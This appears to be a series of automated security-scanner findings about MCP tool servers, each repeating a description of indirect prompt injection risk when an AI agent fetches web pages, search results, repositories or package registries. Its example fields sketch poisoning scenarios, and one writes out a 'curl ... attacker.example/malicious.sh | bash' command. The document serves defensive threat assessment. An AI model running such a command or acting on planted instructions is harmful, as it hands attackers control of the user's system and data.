This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: Tools such as inspectElementsBySelector, getNetworkLogs, getCookies, and runSEOAudit expose arbitrary content from the currently loaded web page into the agent's context, but the agent must actively navigate to the attacker-controlled URL for that content to be returned.

extra_data.example: An attacker publishes malicious guidance and JS on a public page (https://evil.example.com/seo) that tells a visiting auditor to change site behavior; if the agent navigates to that URL and runs Browser Tools MCP/runSEOAudit or Browser Tools MCP/inspectElementsBySelector, the MCP will return the attacker-controlled page content (DOM, scripts, network requests), but the attacker cannot make the agent load that page without the agent initiating the fetch.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: Both tools require the agent to supply the CSV path or JavaScript to execute, so poisoning requires the agent to actively choose and fetch the external resource rather than the attacker being able to push content directly into the agent's monitored inputs.

extra_data.example: An attacker publishes a convincing but false "urgent security advisory" for a popular library on a public blog or GitHub Pages and optimizes it for relevant keywords; if the agent later searches for "library X security advisory" using Claude Web Search, that poisoned page could be returned and consumed.

extra_data.evidence: Claude Web Search returns public web pages that external actors can create and manipulate, but the agent must explicitly query the web for a topic before that content is fetched, so poisoning is possible only when the agent actively searches for the relevant terms.

extra_data.example: An attacker hosts a page at https://attacker.example/poison that contains crafted HTML and scripts describing malicious “update” instructions; if the agent is asked to fetch that URL (via get_html, screenshot, or execute_js), it will return the attacker-controlled content which the agent may then incorporate.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: The get_second_opinion tool uses external web services (Perplexity/Stack Overflow/Gemini). An attacker can publish poisoned posts, but the agent must actively query/search those services to retrieve them, so the attacker cannot force delivery into the agent's context without the agent initiating the fetch.

extra_data.example: An attacker hosts a malicious script at https://attacker.example/malicious.sh; if the agent uses cmd-server/execute_command to run `curl -sSL https://attacker.example/malicious.sh | bash`, the agent will execute and ingest attacker-provided output — but only because the agent chose to fetch that URL.

extra_data.evidence: The tools execute arbitrary shell/SSH commands but do not themselves provide an open submission queue; untrusted content can only reach the agent if the agent issues a command to fetch it (e.g., curl/wget/git/ssh), which is an active fetch requirement.

extra_data.example: An attacker could create a public GitHub repository or add a malicious file to a fork, but the agent will only see that content if it calls code-context-mcp/query_repo with that repository's URL or a file pattern that matches the malicious file.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: The server's tools accept user-supplied "code" or "diagram_code" (untrusted text) which can come from public URLs or repos, but an attacker cannot push content directly into the agent's workflow without the agent actively fetching those external locations, so poisoning requires the agent to initiate retrieval.

extra_data.example: An attacker publishes a malicious blog post or GitHub gist with bogus instructions for "rotating API keys" containing a link or payload; if the agent performs a web_search query for "rotate API keys" it may retrieve and surface that poisoned page in its results.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: All provided tools require the agent to start a Chrome debug session and explicitly open or query URLs; there is no automatic inbox/queue that an external attacker can post into to force content into the agent's context without the agent initiating the fetch.

extra_data.example: An attacker hosts a manipulated image at https://attacker.example/poison.png and publishes a public Replicate model with a typosquatted name like "stability-ai/sdxl-lite"; if the agent later calls image-tools/generate-image with that model name or uses the attacker-controlled image URL for img2img, it may ingest the poisoned content.

extra_data.evidence: All image-tools endpoints require the agent to explicitly request a model, image URL, or run a Google Image search, so external adversaries can only place poisoned content on public URLs or public model registries — they cannot push content directly into the agent's monitored inboxes or pipelines without the agent choosing to fetch it.

extra_data.example: An attacker posts a malicious JSON file at https://attacker.example/malicious.json; the agent will only ingest that content if a user or the agent itself is instructed to call json_read/json_extract with that URL/path.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: All available operations (get_page_source, extract_selectors_from_page_source, get_text, take_screenshot) return data only when the agent explicitly starts a session and requests them, so an external attacker cannot push content into the agent's context without the agent actively opening or fetching the poisoned UI.

extra_data.example: An attacker runs a malicious JSON-RPC endpoint at https://evil-rpc.example that returns fabricated responses (fake latest_block, forged transaction details, or incorrect balances). If the agent calls arbitrum-mcp/set_rpc_url or any tool with rpcUrl set to that endpoint (or otherwise chooses it), subsequent calls like aribtum-mcp/latest_block, get_balance, or get_transaction will return the attacker's poisoned data.

extra_data.evidence: Many tools accept an rpcUrl parameter or use the default RPC (set via set_rpc_url), meaning the agent must explicitly choose or set an external URL to query; only then can an attacker-controlled RPC serve poisoned responses to those tool calls.

extra_data.example: An attacker could publish a malicious README or Copilot instruction in a public GitHub repo, but the agent only ingests it if the agent is explicitly directed to analyze that repository (the tools do not automatically monitor or pull arbitrary GitHub issues/PRs).

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: The server provides fetch_repo and fetch_file which download and index content from public Git repos and URLs when invoked; an external attacker can publish content to those public sources, but cannot force it into the index without the agent actively fetching them.

extra_data.example: Attacker posts a malicious how-to article or manipulated README on a public website or gist describing "how to configure X securely." If the agent calls LongCheerService/search for guidance on "configure X", the search tool may return that malicious page and the agent could ingest and act on the poisoned instructions.

extra_data.evidence: LongCheerService provides a search tool used to perform network searches only when invoked, so poisoning requires the agent to actively search for a topic and then retrieve attacker-controlled public web content; there is no evidence of unauthenticated inboxes, Git issue ingestion, or other push-based channels that would allow forced delivery.

extra_data.example: An attacker could bring a rogue Lovense-compatible device that advertises a deceptive name/ID; it will only appear in the agent's outputs if the agent calls lovense-mcp-server/search_toy and discovers it during the scan.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: The provided tools (mcp-bajobs/get_jobs and mcp-bajobs/nl_get_jobs) are search endpoints the agent must invoke to retrieve listings, so untrusted content exists but requires the agent to actively fetch specific queries before it can be exposed.

extra_data.example: An attacker could publish malicious code or a poisoned repo on GitHub, but the agent must first invoke the generated search query or create/run the generated batch spec against those repositories to retrieve or act on that content.

extra_data.evidence: The tools exposed (generateSearchQuery and generateBatchSpec) return text artifacts (queries/specs) and do not automatically fetch or stream external repository content; the agent must explicitly run searches or apply the batch spec to pull in any external code, so poisoning requires the agent to actively fetch specific targets.

extra_data.example: An attacker publishes a malicious .faf in a public GitHub repo (e.g., https://github.com/attacker/branding/.faf); if the agent is later instructed to fetch that repo for project DNA and supplies the .faf to mcp-big-orange/brand_palette, the generated palette will reflect the attacker-controlled data.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: The tool requires the agent to pass a specific URL to extract_content, so poisoning relies on the agent actively fetching attacker-controlled webpages rather than the attacker submitting content into a monitored inbound queue.

extra_data.example: An attacker publishes a webpage with spoofed creation/modification metadata at https://evil.example/news.html; the mcp-webpage-timestamps tool would extract those timestamps only if the agent is directed to that URL (the attacker cannot push that page into the agent's workflow by itself).

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: The link-opener tool returns a search link but does not fetch or push content into the agent; exposure requires the agent to actively visit search results, matching the "URL Fetchers" scenario where the agent initiates retrieval.

extra_data.example: An attacker publishes a blog post or GitHub Pages site with step‑by‑step instructions that subtly bias or mislead an assistant (e.g., wrong security commands or phished API endpoints). If the agent runs mmnt_search for a troubleshooting query and then calls mmnt_cache to load the page, the agent may ingest the poisoned instructions.

extra_data.evidence: Mamont provides a search API (mmnt_search) and a cached page fetcher (mmnt_cache) that read publicly indexed web content; an attacker can publish and have pages indexed, but cannot force those pages into the agent's context without the agent choosing to search/fetch them.

extra_data.example: An attacker publishes a malicious webpage or sitemap on attacker-controlled.example and waits; the agent will only ingest that content if it is explicitly given the URL (indexfoundry_connect_url / indexfoundry_connect_sitemap) or if someone calls project_add_source with the attacker's URL — the server does not autonomously ingest external submissions.

This issue occurs when an AI agent actively fetches content from public web sources, search engines, or open package registries where attackers may publish poisoned data.
While the agent must explicitly search for or navigate to this content, the returned results may still contain malicious instructions designed to exploit the agent.
extra_data.explanation:
Actively retrieving content from untrusted sources introduces risk of indirect prompt injection through search result poisoning or typosquatting attacks.
Although attackers cannot force delivery, they can still manipulate public search indexes, plant malicious packages in registries, or create poisoned web pages that the agent may encounter when performing legitimate research tasks.
extra_data.evidence: Tasks are created only via the browser-extension capture flow (required fields like user_prompt and element_snapshot are provided by the capturing user), so an attacker must lure or compromise a user to induce a task — they cannot directly push arbitrary content into the MCP queue without user interaction.

extra_data.example: An attacker publishes a typosquatted documentation site (e.g., "exampl3-docs.com") containing poisoned instructions; the agent would only ingest that content if it runs tavily_search, tavily_extract, or tavily_crawl against that domain or finds it in search results.

extra_data.evidence: All listed tools are URL/search/crawl fetchers that require the agent to initiate queries or provide URLs; while attackers can publish untrusted pages, they cannot make the agent consume them without the agent actively retrieving those pages.

extra_data.example: An attacker publishes a malicious public GitHub repository or a typosquatted dependency; the benign agent must first call create_repo or otherwise configure/list the repo and then call start_scan or tca_issue_list to retrieve analysis results that include the attacker's content.
